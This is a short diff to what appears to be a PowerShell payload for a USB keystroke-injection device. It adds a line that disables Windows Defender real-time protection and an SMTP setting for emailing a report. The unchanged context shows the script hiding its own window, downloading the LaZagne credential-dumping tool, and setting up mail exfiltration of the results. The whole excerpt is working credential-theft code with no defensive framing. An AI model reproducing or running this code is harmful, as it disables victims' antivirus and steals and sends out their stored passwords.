@@ -77,7 +77,8 @@ public static extern bool SetForegroundWindow(IntPtr hWnd);
 
 Set-Alias -Name 'Set-WindowStyle' -Value 'Set-WindowState'
 
-
+# Disable real time protection
+Set-MpPreference -DisableRealtimeMonitoring $true
 # Minimize window 
 Get-Process -ID $PID | Set-WindowState -State HIDE
 # Create a tmp directory in the Downloads folder
@@ -100,6 +101,7 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 #Mail Exfiltration
 $From = "" # Put the SENDER HERE
 $To = "" # Put the RECEIVER HERE
+$smtp = "" # PUT YOUR SMTP SERVER HERE (TESTED WITH GOOGLE)
 $Subject = "Ducky Rapport"
 $Body = "Hi, here is the Rapport"
 
